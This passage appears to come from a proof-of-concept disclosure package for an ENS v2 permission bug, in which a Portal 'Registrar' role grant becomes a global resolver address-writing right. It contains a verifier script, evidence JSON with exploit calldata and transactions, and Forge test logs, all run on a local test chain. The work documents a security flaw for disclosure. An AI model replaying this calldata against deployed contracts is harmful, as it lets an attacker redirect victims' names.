        emit log_named_uint("PermissionedResolver ROLE_SET_ADDR bitmap", executedResolverRole);
        emit log_named_bytes32("grantRootRoles selector", bytes32(IEnhancedAccessControl.grantRootRoles.selector));
        emit log_named_bytes("Portal Registrar calldata", portalCalldata);
        emit log_named_uint("pre-grant attacker setAddr reverted", 1);
        emit log_named_uint(
            "attacker has root ROLE_SET_ADDR",
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_ADDR, attacker) ? 1 : 0
        );
        emit log_named_address("resolver output before", beforeAddress);
        emit log_named_address("resolver output after", afterAddress);
    }
}
```

**Embedded file: `verify_receipts.mjs`**

```javascript
#!/usr/bin/env node

import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { dirname, resolve } from 'node:path'

const [builderArg, receiptArg, forgeArg, outputArg] = process.argv.slice(2)
if (!builderArg || !receiptArg || !forgeArg || !outputArg) {
  throw new Error('usage: node verify_receipts.mjs <builder.json> <receipt.json> <forge.txt> <output.json>')
}

const builderPath = resolve(builderArg)
const receiptPath = resolve(receiptArg)
const forgePath = resolve(forgeArg)
const outputPath = resolve(outputArg)
const builderBytes = readFileSync(builderPath)
const receiptBytes = readFileSync(receiptPath)
const forgeBytes = readFileSync(forgePath)
const builder = JSON.parse(builderBytes)
const receipt = JSON.parse(receiptBytes)
const forgeOutput = forgeBytes.toString('utf8')
const primary = builder.inputs.executedPrimaryEnsjsBuilderResult

const lower = (value) => value.toLowerCase()
const checks = {
  builderVerdictPass: builder.verdict === 'PASS',
  directRouteTargetsReceiptProxy:
    lower(builder.inputs.target) === lower(receipt.deployment.proxy.address),
  routeTableTargetsReceiptProxy:
    lower(builder.outputs.afterMaterializationAdmin.tableAddress) ===
    lower(receipt.deployment.proxy.address),
  addUserSheetTargetsReceiptProxy:
    lower(builder.outputs.afterMaterializationAdmin.sheetAddress) ===
    lower(receipt.deployment.proxy.address),
  registrarDisplayed:
    builder.inputs.primaryDisplayedRole ===
    'ROLE_REGISTRAR / Registrar / Can register new labels',
  registrarBitmapIsOne: primary.args[0] === '1',
  rootGrantFunctionSelected: primary.functionName === 'grantRootRoles',
  builderTargetsReceiptProxy: lower(primary.address) === lower(receipt.grantTransaction.to),
  builderRecipientIsAttacker: lower(primary.args[1]) === lower(receipt.actors.attacker),
  minedInputEqualsBuilderCalldata:
    lower(primary.calldata) === lower(receipt.grantTransaction.input),
  grantReceiptSucceeded: receipt.grantTransaction.status === 1,
  preGrantRoleAbsent: receipt.preState.attackerHasRootRoleBit0 === false,
  preGrantSetAddrReverted:
    receipt.assertions.preGrantSetAddrReverted === true,
  postGrantRolePresent: receipt.postGrantState.attackerHasRootRoleBit0 === true,
  exploitSignedByAttacker:
    lower(receipt.exploitTransaction.from) === lower(receipt.actors.attacker),
  exploitReceiptSucceeded: receipt.exploitTransaction.status === 1,
  resolverOutputIsAttacker:
    lower(receipt.terminalState.resolverAddr) === lower(receipt.actors.attacker),
  forgeSameImpactTestPassed:
    forgeOutput.includes('[PASS] testDirectRegistrarBitBecomesGlobalSetAddr()'),
  forgeSuiteHasNoFailure:
    forgeOutput.includes('3 tests passed, 0 failed, 0 skipped'),
  sameRootCauseAndImpact:
    receipt.assertions.sameRootCauseAndImpactAsSource === true,
}

for (const [name, passed] of Object.entries(checks)) {
  assert.equal(passed, true, `failed check: ${name}`)
}

const sha256 = (bytes) => createHash('sha256').update(bytes).digest('hex')
const result = {
  schema: 'm06_same_impact_independent_verdict_v1',
  verdict: 'PASS',
  passed: Object.keys(checks).length,
  total: Object.keys(checks).length,
  checks,
  inputSha256: {
    builder: sha256(builderBytes),
    receipt: sha256(receiptBytes),
    forge: sha256(forgeBytes),
  },
}

mkdirSync(dirname(outputPath), { recursive: true })
writeFileSync(outputPath, `${JSON.stringify(result, null, 2)}\n`)
console.log(JSON.stringify(result, null, 2))
```

**Embedded file: `run_20_checks.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

node verify_receipts.mjs \
  evidence/portal_builder.json \
  evidence/local_receipt.json \
  evidence/forge_output.txt \
  evidence/verdict.json

jq -e \
  '.verdict == "PASS" and .passed == 20 and .total == 20 and ([.checks[] | select(. != true)] | length == 0)' \
  evidence/verdict.json >/dev/null

echo "PASS receipt linkage 20/20"
```

**Embedded file: `evidence/portal_builder.json`**

```json
{
  "schema": "m06_direct_registry_route_experiment_v1",
  "verdict": "PASS",
  "versions": {
    "node": "v22.23.2",
    "esbuild": "0.28.1",
    "portalCommit": "1c9b47f18fcddd2e864dfe385c4171061c9811ae",
    "ensjs": "5.0.0-alpha.1"
  },
  "verifiedSources": {
    "route": {
      "path": "apps/portal/src/routes/registry/$address/roles.tsx",
      "sha256": "c871a98f09ebb8d9f6e578a51e658feddd0adf81fff79c9662190be291abbf08"
    },
    "permissions": {
      "path": "apps/portal/src/lib/roles/permissions.ts",
      "sha256": "26c464da1f71c2f940300f303550f28797322410b545f17ff5ee4237bc24a884"
    },
    "registryRoles": {
      "path": "apps/portal/node_modules/@ensdomains/ensjs/src/utils/v2/roles/registryRoles.ts",
      "sha256": "074ae91b400735dcde824585cea7386bea3c700be27a8f88c1ed292b08e3d895"
    },
    "grantRoles": {
      "path": "apps/portal/node_modules/@ensdomains/ensjs/src/actions/wallet/v2/grantRoles.ts",
      "sha256": "19611dc48504fe51b94c68e9c41145a7159bf371c13a73b4d75dda65dc59da26"
    }
  },
  "inputs": {
    "directPath": "/registry/0xe17482932D009e08429BEb786Ca4EC4490A4743D/roles",
    "target": "0xe17482932D009e08429BEb786Ca4EC4490A4743D",
    "caller": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "materializedRegistryRow": true,
    "primaryDisplayedRole": "ROLE_REGISTRAR / Registrar / Can register new labels",
    "primaryRegistryBitmap": "1",
    "executedPrimaryEnsjsBuilderResult": {
      "address": "0xe17482932D009e08429BEb786Ca4EC4490A4743D",
      "functionName": "grantRootRoles",
      "args": [
        "1",
        "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
      ],
      "calldata": "0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8"
    },
    "alternateDisplayedRole": "ROLE_REGISTER_RESERVED / Register Reserved",
    "alternateRegistryBitmap": "16",
    "rootGrantFunction": "grantRootRoles",
    "executedEnsjsBuilderResult": {
      "address": "0xe17482932D009e08429BEb786Ca4EC4490A4743D",
      "functionName": "grantRootRoles",
      "args": [
        "16",
        "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
      ]
    }
  },
  "outputs": {
    "beforeMaterialization": {
      "types": [
        "NotFoundMessage"
      ],
      "text": [],
      "tableAddress": null,
      "sheetAddress": null
    },
    "afterMaterializationAdmin": {
      "types": [
        "div",
        "div",
        "h1",
        "Button",
        "Plus",
        "RegistryRolesTable",
        "RegistryAddUserSheet"
      ],
      "text": [
        "Roles",
        "Add User"
      ],
      "tableAddress": "0xe17482932D009e08429BEb786Ca4EC4490A4743D",
      "sheetAddress": "0xe17482932D009e08429BEb786Ca4EC4490A4743D"
    },
    "afterMaterializationNonAdmin": {
      "types": [
        "div",
        "div",
        "h1",
        "RegistryRolesTable"
      ],
      "text": [
        "Roles"
      ],
      "tableAddress": "0xe17482932D009e08429BEb786Ca4EC4490A4743D",
      "sheetAddress": null
    }
  },
  "conclusions": {
    "directNavigationNeedsNoNameRolesViewAfterMaterialization": true,
    "materializedRowIsTheOnlyRegistryTypeGateInThisComponent": true,
    "adminStateEnablesAddUserForTheBareRouteAddress": true,
    "nonAdminStateSuppressesAddUser": true,
    "portalDisplaysRegistrarAsCanRegisterNewLabels": true,
    "ensjsBuilderExecutedRegistrarAsBit0RootGrant": true,
    "portalOffersAlternateRegisterReservedRole": true,
    "ensjsBuilderExecutedAlternateRoleAsBit4RootGrant": true
  },
  "limits": [
    "Component-level execution with injected query results; no browser, wallet, or live indexer was used.",
    "The experiment validates the direct route decision after materialization, not how a production indexer materializes the row.",
    "No public chain endpoint was contacted."
  ]
}
```

**Embedded file: `evidence/local_receipt.json`**

```json
{
  "schema": "m06_same_impact_local_receipt_v1",
  "verdict": "PASS",
  "boundary": "Hash-verified Portal component and ENSJS builder execution followed by raw-calldata wallet transactions on the same local PermissionedResolver proxy; no full browser or production indexer.",
  "network": {
    "kind": "ephemeral-local-anvil",
    "chainId": 31337,
    "finalBlock": 5,
    "publicRpcContacted": false
  },
  "actors": {
    "admin": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "attacker": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
  },
  "deployment": {
    "factory": {
      "address": "0x5FbDB2315678afecb367f032d93F642f64180aa3",
      "transactionHash": "0x4ea76a8d940c79e20e5ecf4afae9172683638f3a6b4f2fcdcbfd4710986054eb",
      "blockNumber": 1,
      "status": 1
    },
    "implementation": {
      "address": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
      "transactionHash": "0xa63d72cd91b05a499602ea18ec26f46d3faf687feaf1bb28844d43ad6fee8485",
      "blockNumber": 2,
      "status": 1
    },
    "proxy": {
      "address": "0xe17482932D009e08429BEb786Ca4EC4490A4743D",
      "transactionHash": "0xb80c7ea151210f7d923f7bc07e5d11960b269f42de011137b6e1f09b92e8b1e4",
      "blockNumber": 3,
      "status": 1,
      "codeBytes": 77,
      "eip1967ImplementationWord": "0x000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512"
    }
  },
  "portalAndBuilder": {
    "evidence": "same_impact_portal_builder.json",
    "directPath": "/registry/0xe17482932D009e08429BEb786Ca4EC4490A4743D/roles",
    "displayedRole": "Registrar / Can register new labels",
    "role": "ROLE_REGISTRAR",
    "bitmap": 1,
    "functionName": "grantRootRoles",
    "attacker": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
    "calldata": "0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8"
  },
  "preState": {
    "victimName": "victim.eth",
    "victimNode": "0xbcd911c24315ec3ae9d15c717a3fa5ebad9350f30820d703c1f0bb70f9d95d09",
    "attackerHasRootRoleBit0": false,
    "resolverAddr": "0x0000000000000000000000000000000000000000",
    "attackerSetAddrSimulation": "reverted with permission custom error"
  },
  "grantTransaction": {
    "hash": "0xfa55eeedce4b46f030622fe6cc37adf6531e4c02e4e164623f2b224c16eea48d",
    "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
    "to": "0xe17482932d009e08429beb786ca4ec4490a4743d",
    "input": "0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8",
    "inputEqualsPortalBuilderCalldata": true,
    "blockNumber": 4,
    "status": 1,
    "gasUsed": 63047
  },
  "postGrantState": {
    "attackerHasRootRoleBit0": true,
    "permissionedResolverMeaning": "ROLE_SET_ADDR"
  },
  "exploitTransaction": {
    "hash": "0x18513b5499e1cc27816b273fc4e8a76da95800abb90c39b755cadd4f732e0147",
    "from": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
    "to": "0xe17482932d009e08429beb786ca4ec4490a4743d",
    "input": "0xd5fa2b00bcd911c24315ec3ae9d15c717a3fa5ebad9350f30820d703c1f0bb70f9d95d0900000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8",
    "blockNumber": 5,
    "status": 1,
    "gasUsed": 64311
  },
  "terminalState": {
    "resolverAddr": "0x70997970C51812dc3A010C7d01b50e0d17dc79C8",
    "sameImpactTransition": "attacker address-writing capability false -> true; resolver output zero -> attacker"
  },
  "assertions": {
    "directRouteEnabledAddUserAfterMaterialization": true,
    "portalDisplayedRegistrar": true,
    "ensjsBuiltBit0RootGrant": true,
    "walletInputByteEqualsBuilderCalldata": true,
    "grantReceiptSucceeded": true,
    "preGrantSetAddrReverted": true,
    "postGrantSetAddrSucceeded": true,
    "attackerSignedExploit": true,
    "resolverOutputChangedToAttacker": true,
    "sameRootCauseAndImpactAsSource": true
  }
}
```

**Embedded file: `evidence/forge_output.txt`**

```
No files changed, compilation skipped

Ran 3 tests for test/ExecutedRouteSearch.t.sol:ExecutedRouteSearchTest
[PASS] testAlternateRegisterReservedBitBecomesGlobalSetText() (gas: 4034922)
Logs:
  Portal Registry ROLE_REGISTER_RESERVED bitmap: 16
  PermissionedResolver ROLE_SET_TEXT bitmap: 16
  grantRootRoles selector: 0x072d5d7700000000000000000000000000000000000000000000000000000000
  portal-like calldata: 0x072d5d77000000000000000000000000000000000000000000000000000000000000001000000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
  attacker has root ROLE_SET_TEXT: 1
  written text value: https://attacker.invalid

[PASS] testDirectRegistrarBitBecomesGlobalSetAddr() (gas: 4038048)
Logs:
  Portal Registry ROLE_REGISTRAR bitmap: 1
  PermissionedResolver ROLE_SET_ADDR bitmap: 1
  grantRootRoles selector: 0x072d5d7700000000000000000000000000000000000000000000000000000000
  Portal Registrar calldata: 0x072d5d77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
  pre-grant attacker setAddr reverted: 1
  attacker has root ROLE_SET_ADDR: 1
  resolver output before: 0x0000000000000000000000000000000000000000
  resolver output after: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

[PASS] testResolverOnlyVersusSubregistryDrivenDiscovery() (gas: 1453073)
Logs:
  resolver-only leaf: 0x0000000000000000000000000000000000000000
  resolver-only resolver target: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  subregistry-driven leaf: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
  resolver-only leaf reachable: 0
  subregistry-driven leaf reachable: 1

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 590.29µs (773.79µs CPU time)

Ran 1 test suite in 5.93ms (590.29µs CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

**Embedded file: `evidence/verdict.json`**

```json
{
  "schema": "m06_same_impact_independent_verdict_v1",
  "verdict": "PASS",
  "passed": 20,
  "total": 20,
  "checks": {
    "builderVerdictPass": true,
    "directRouteTargetsReceiptProxy": true,
    "routeTableTargetsReceiptProxy": true,
    "addUserSheetTargetsReceiptProxy": true,
    "registrarDisplayed": true,
    "registrarBitmapIsOne": true,
    "rootGrantFunctionSelected": true,
    "builderTargetsReceiptProxy": true,
    "builderRecipientIsAttacker": true,
    "minedInputEqualsBuilderCalldata": true,
    "grantReceiptSucceeded": true,
    "preGrantRoleAbsent": true,
    "preGrantSetAddrReverted": true,
    "postGrantRolePresent": true,
    "exploitSignedByAttacker": true,
    "exploitReceiptSucceeded": true,
    "resolverOutputIsAttacker": true,
    "forgeSameImpactTestPassed": true,
    "forgeSuiteHasNoFailure": true,
    "sameRootCauseAndImpact": true
  },
  "inputSha256": {
    "builder": "1ab5c52564215794d8a280304dbee09b227db021661c2efab45da37b19ec18c7",
    "receipt": "d1a9b906d9157d1df16dd544d8d1babbb76efc51775d1c8e568d9b5b6ff8baa7",
    "forge": "6024689465a958be42bc35807660292c9edbe74d9cc6b983661a36375a7e9ab0"
  }
}
```
